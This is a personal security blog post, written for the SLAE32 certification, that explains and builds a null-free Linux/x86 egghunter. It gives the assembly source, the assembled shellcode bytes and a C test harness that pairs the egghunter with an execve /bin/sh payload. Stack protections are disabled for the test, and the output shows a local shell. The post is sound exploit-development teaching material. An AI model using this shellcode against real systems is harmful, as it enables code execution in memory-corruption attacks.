<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SLAE32 Assignment 3 - Egghunter Shellcode | nibbles</title>
<meta name="keywords" content="slae32">
<meta name="description" content="This post introduces the third mission of my SLAE32 journey.
A fantastic challenge not covered during the course made me research and understand the concept and which scenarios it&rsquo;s applicable.
Introduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:
Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory?">
<meta name="author" content="nibbles">
<link rel="canonical" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="SLAE32 Assignment 3 - Egghunter Shellcode" />
<meta property="og:description" content="This post introduces the third mission of my SLAE32 journey.
A fantastic challenge not covered during the course made me research and understand the concept and which scenarios it&rsquo;s applicable.
Introduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:
Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-28T14:12:10+00:00" />
<meta property="article:modified_time" content="2022-12-28T14:12:10+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SLAE32 Assignment 3 - Egghunter Shellcode"/>
<meta name="twitter:description" content="This post introduces the third mission of my SLAE32 journey.
A fantastic challenge not covered during the course made me research and understand the concept and which scenarios it&rsquo;s applicable.
Introduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:
Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory?"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://0xnibbles.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SLAE32 Assignment 3 - Egghunter Shellcode",
      "item": "https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SLAE32 Assignment 3 - Egghunter Shellcode",
  "name": "SLAE32 Assignment 3 - Egghunter Shellcode",
  "description": "This post introduces the third mission of my SLAE32 journey.\nA fantastic challenge not covered during the course made me research and understand the concept and which scenarios it\u0026rsquo;s applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory?",
  "keywords": [
    "slae32"
  ],
  "articleBody": " This post introduces the third mission of my SLAE32 journey.\nA fantastic challenge not covered during the course made me research and understand the concept and which scenarios it’s applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory??? What is a Egghunter? An egghunter is useful when an attacker controls limited buffer space to put an entire shellcode on the stack.\nTo get around this constraint, an egghunter acts as a staged payload. This means the smaller payload can search through the entire memory space for a maker or egg. Once the egg is found, it indicates the start of the larger payload (shellcode) and redirects the execution flow to the instructions placed after the egg.\nSkape made a reference research paper in 2004 named Safely Searching Process Virtual Address Space with practical examples of different egghunter implementations.\nBasic Concepts Before going into the code details, it’s essential to have in mind some concepts to understand the internals of an egghunter.\nx86 Linux Memory Pages The manybutfinite.com article about Linux memory management states that:\n“x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on.”\nThis is essential because our egghunter will be iterating through memory pages searching for the egg.\nIf the egghunter can use a syscall to check for the egg on page 0 (bytes 0-4095) and if the used syscall returns an exit code that states if the memory location is accessible or not, based on that, the egghunter can skip to the next page of memory (page 1).\nThis way saves time and increases its performance.\nAccess Syscall - Can we read or not? Based on Skape paper, some syscalls can be used for this task. For this assignment, I used the access(2) syscall.\nThe purpose of access(2) syscall is to check effectively if a page memory is accessible or not. According to the access man page (man 2 access), this syscall is used to check if the calling process has access to a determined file.\nWe will use exit codes to check memory page permissions in this assignment context. If it returns an error (EFAULT) with the value 0xf2, it means the memory page is inaccessible. If return any other matter, we are good to go to search that page looking for the egg.\nDouble Egg We know the egg should be placed right before the shellcode by this time. We can make it more robust by placing it twice instead of once. This way, if the egghunter finds itself, we avoid unexpected behaviour from the program.\nIn practical terms, the shellcode structure is: egg+egg+shellcode\n“Assembling” our Egghunter First, the egg is placed into ebx. This register will be used to compare with memory content.\nmul ecx after clearing the ecx register is used to clear eax and edx. mul multiplies its operand with eax and saves the result in eax and edx. A small trick to save space with fewer opcodes.\nmov ebx, 0x50905090 ; the egg - 0x50905090 xor ecx, ecx mul ecx ; trick clear eax and edx After that, we mov 0xffff (4095 bytes) to dx. A memory page has 4096 bytes in size, but putting the value 0x1000 (4096 bytes) in dx will contain null bytes. Instead, we mov 0xffff to dx and increment it after inc edx inside the address_inspection: branch.\npage_alignment: or dx, 0xfff ; sets dx to 4095 address_inspection: inc edx ; sets dx to 4096 The next step is to analyze the memory page and check if we are able to access it. To achieve this goal, the address_inspection: branch will start incrementing edx to have make it 4096. After that, to preserve the register values push their value into the stack with pushad instruction.\nThen, we put the following 4 bytes of memory into ebx, load the access(2) syscall to al, and execute it on that memory address.\naddress_inspection: inc edx ; edx becomes 4096 pushad ; saves all registers values lea ebx, [edx+4] ; load the address of the next 4 bytes mov al, 0x21 ; set the value of the access syscall int 0x80 To verify if the memory page is accessible or not, we will use the compare opcode - cmp.\nThe compare cmp opcode takes two operands and subtracts them; if the result is a 0, the zero flag is set, and you know that the two operands are equal.\nThe return code is saved into eax. If the EFAULT (0xf2) error exists, our shellcode will jump to the page_alignment: branch to check the following memory page.\ncmp al, 0xf2 popad jz page_alignment But if the memory can be accessed, we will compare the value of the accessible memory, which is stored at edx, with ebx, which holds our egg. We we will jump to our address_inspection: branch and read through the page.\nIf the value of what is stored at edx matches our egg, then we have to see if [edx]+4 also does to ensure we don’t have a false positive and match our double egg requirement. If it is only found once, then it’s probably just our egghunter finding itself.\nFinally, if both cmp calls result in zeros, we tell the code to jump to edx, which will execute the code stored there (our real shellcode).\ncmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Final Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 3 : Egghunter Shellcode (Linux/x86) Assembly ; File Name : egg_hunter.nasm global _start section .text _start: mov ebx, 0x50905090 xor ecx, ecx mul ecx page_alignment: or dx, 0xfff address_inspection: inc edx pushad lea ebx, [edx+4] mov al, 0x21 int 0x80 cmp al, 0xf2 popad jz page_alignment cmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Compiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ../../assembler.sh egg_hunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 39 \"\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char egghunter[] = \"\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\"; unsigned char shellcode[] = \"\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"; int main(void) { printf(\"Egg hunter length: %d\\n\", strlen(egghunter)); printf(\"Shellcode length: %d\\n\", strlen(shellcode)); void (*s)() = (void *)egghunter; s(); return 0; } I used the execve shellcode stack covered during the course to execute a shell .\nCompiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o egghunter_tester shellcode.c ╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ./egghunter_tester Egg hunter length: 39 Shellcode length: 33 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ ls egg_hunter egg_hunter.nasm egg_hunter.o egghunter_tester shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
  "wordCount" : "1219",
  "inLanguage": "en",
  "datePublished": "2022-12-28T14:12:10Z",
  "dateModified": "2022-12-28T14:12:10Z",
  "author":{
    "@type": "Person",
    "name": "nibbles"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nibbles",
    "logo": {
      "@type": "ImageObject",
      "url": "https://0xnibbles.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://0xnibbles.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/about.html" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      SLAE32 Assignment 3 - Egghunter Shellcode
    </h1>
    <div class="post-meta"><span title='2022-12-28 14:12:10 +0000 UTC'>December 28, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;nibbles

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
                        
                <li>
                    <a href="#hunting-eggs-in-memory-what-is-a-egghunter" aria-label="Hunting eggs in memory??? What is a Egghunter?">Hunting eggs in memory??? What is a Egghunter?</a></li></ul>
                </li>
                <li>
                    <a href="#basic-concepts" aria-label="Basic Concepts">Basic Concepts</a><ul>
                        <ul>
                        <ul>
                        
                <li>
                    <a href="#x86-linux-memory-pages" aria-label="x86 Linux Memory Pages">x86 Linux Memory Pages</a></li>
                <li>
                    <a href="#access-syscall---can-we-read-or-not" aria-label="Access Syscall - Can we read or not?">Access Syscall - Can we read or not?</a></li></ul>
                    
                <li>
                    <a href="#double-egg" aria-label="Double Egg">Double Egg</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#assembling-our-egghunter" aria-label="&amp;ldquo;Assembling&amp;rdquo; our Egghunter">&ldquo;Assembling&rdquo; our Egghunter</a></li>
                <li>
                    <a href="#final-assembly-code" aria-label="Final Assembly Code">Final Assembly Code</a></li>
                <li>
                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
</p>
<p>This post introduces the third mission of my SLAE32 journey.</p>
<p>A fantastic challenge not covered during the course made me research and understand the concept and which scenarios it&rsquo;s applicable.</p>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:</p>
<ul>
<li>Create a working demo of the Egghunter;</li>
<li>The shellcode should be <strong>null-free</strong>;</li>
<li>With the ability to be configurable for different payloads.</li>
</ul>
<h3 id="hunting-eggs-in-memory-what-is-a-egghunter">Hunting eggs in memory??? What is a Egghunter?<a hidden class="anchor" aria-hidden="true" href="#hunting-eggs-in-memory-what-is-a-egghunter">#</a></h3>
<p>An egghunter is useful when an attacker controls limited buffer space to put an entire shellcode on the stack.</p>
<p>To get around this constraint, an egghunter acts as a staged payload. This means the smaller payload can search through the entire memory space for a maker or egg. Once the egg is found, it indicates the start of the larger payload (shellcode) and redirects the execution flow to the instructions placed after the egg.</p>
<p>Skape made a reference research paper in 2004 named <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> with practical examples of different egghunter implementations.</p>
<h2 id="basic-concepts">Basic Concepts<a hidden class="anchor" aria-hidden="true" href="#basic-concepts">#</a></h2>
<p>Before going into the code details, it’s essential to have in mind some concepts to understand the <em>internals</em> of an egghunter.</p>
<h5 id="x86-linux-memory-pages">x86 Linux Memory Pages<a hidden class="anchor" aria-hidden="true" href="#x86-linux-memory-pages">#</a></h5>
<p>The <a href="https://manybutfinite.com/post/how-the-kernel-manages-your-memory/">manybutfinite.com</a> article about Linux memory management states that:</p>
<blockquote>
<p>“x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on.”</p>
</blockquote>
<p>This is essential because our egghunter will be iterating through memory pages searching for the egg.<br>
If the egghunter can use a syscall to check for the egg on page 0 (bytes 0-4095) and if the used syscall returns an exit code that states if the memory location is accessible or not, based on that, the egghunter can skip to the next page of memory (page 1).<br>
This way saves time and increases its performance.</p>
<h5 id="access-syscall---can-we-read-or-not">Access Syscall - Can we read or not?<a hidden class="anchor" aria-hidden="true" href="#access-syscall---can-we-read-or-not">#</a></h5>
<p>Based on Skape paper, some syscalls can be used for this task. For this assignment, I used the access(2) syscall.</p>
<p>The purpose of access(2) syscall is to check effectively if a page memory is accessible or not. According to the access man page (<code>man 2 access</code>), this syscall is used to check if the calling process has access to a determined file.</p>
<p>We will use exit codes to check memory page permissions in this assignment context. If it returns an error (EFAULT) with the value <code>0xf2</code>, it means the memory page is inaccessible. If return any other matter, we are good to go to search that page looking for the egg.</p>
<h4 id="double-egg">Double Egg<a hidden class="anchor" aria-hidden="true" href="#double-egg">#</a></h4>
<p>We know the egg should be placed right before the shellcode by this time. We can make it more robust by placing it twice instead of once. This way, if the egghunter finds itself, we avoid unexpected behaviour from the program.</p>
<p>In practical terms, the shellcode structure is: <code>egg+egg+shellcode</code></p>
<h2 id="assembling-our-egghunter">&ldquo;Assembling&rdquo; our Egghunter<a hidden class="anchor" aria-hidden="true" href="#assembling-our-egghunter">#</a></h2>
<p>First, the egg is placed into <code>ebx</code>. This register will be used to compare with memory content.</p>
<p><code>mul ecx</code> after clearing the <code>ecx</code> register is used to clear <code>eax</code> and <code>edx</code>. <code>mul</code> multiplies its operand with eax and saves the result in <code>eax</code> and <code>edx</code>. A small trick to save space with fewer opcodes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">0x50905090</span> <span style="color:#75715e">; the egg - 0x50905090
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">ecx</span>             <span style="color:#75715e">; trick clear eax and edx
</span></span></span></code></pre></div><p>After that, we mov <code>0xffff</code> (4095 bytes) to <code>dx</code>. A memory page has 4096 bytes in size, but putting the value <code>0x1000</code> (4096 bytes) in dx will contain null bytes. Instead, we mov <code>0xffff</code> to <code>dx</code> and increment it after <code>inc edx</code> inside the <code>address_inspection:</code> branch.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>page_alignment:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">or</span> <span style="color:#66d9ef">dx</span>, <span style="color:#ae81ff">0xfff</span>    <span style="color:#75715e">; sets dx to 4095
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>address_inspection:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; sets dx to 4096
</span></span></span></code></pre></div><p>The next step is to analyze the memory page and check if we are able to access it. To achieve this goal, the <code>address_inspection:</code> branch will start incrementing <code>edx</code> to have make it <code>4096</code>. After that, to preserve the register values push their value into the stack with <code>pushad</code> instruction.</p>
<p>Then, we put the following 4 bytes of memory into <code>ebx</code>, load the access(2) syscall to <code>al</code>, and execute it on that memory address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>address_inspection:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; edx becomes 4096
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">pushad</span>              <span style="color:#75715e">; saves all registers values
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">edx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]    <span style="color:#75715e">; load the address of the next 4 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x21</span>        <span style="color:#75715e">; set the value of the access syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span></code></pre></div><p>To verify if the memory page is accessible or not, we will use the compare opcode - <code>cmp</code>.</p>
<p>The compare <code>cmp</code> opcode takes two operands and subtracts them; if the result is a 0, the zero flag is set, and you know that the two operands are equal.</p>
<p>The return code is saved into <code>eax</code>. If the EFAULT (<code>0xf2</code>) error exists, our shellcode will jump to the <code>page_alignment:</code> branch to check the following memory page.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xf2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">popad</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">page_alignment</span>
</span></span></code></pre></div><p>But if the memory can be accessed, we will compare the value of the accessible memory, which is stored at edx, with ebx, which holds our egg. We we will jump to our <code>address_inspection:</code> branch and read through the page.</p>
<p>If the value of what is stored at <code>edx</code> matches our egg, then we have to see if <code>[edx]+4</code> also does to ensure we don&rsquo;t have a false positive and match our double egg requirement. If it is only found once, then it’s probably just our egghunter finding itself.</p>
<p>Finally, if both <code>cmp</code> calls result in zeros, we tell the code to jump to <code>edx</code>, which will execute the code stored there (our real shellcode).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">ebx</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">edx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>], <span style="color:#66d9ef">ebx</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edx</span>
</span></span></code></pre></div><h2 id="final-assembly-code">Final Assembly Code<a hidden class="anchor" aria-hidden="true" href="#final-assembly-code">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 3 : Egghunter Shellcode (Linux/x86) Assembly
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; File Name    : egg_hunter.nasm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">0x50905090</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>page_alignment:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">or</span> <span style="color:#66d9ef">dx</span>, <span style="color:#ae81ff">0xfff</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>address_inspection:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">edx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pushad</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">edx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x21</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xf2</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">popad</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">page_alignment</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">ebx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">edx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>], <span style="color:#66d9ef">ebx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edx</span>
</span></span></code></pre></div><h2 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h2>
<p>Checking <code>assembler.sh</code> output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh egg_hunter.nasm 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
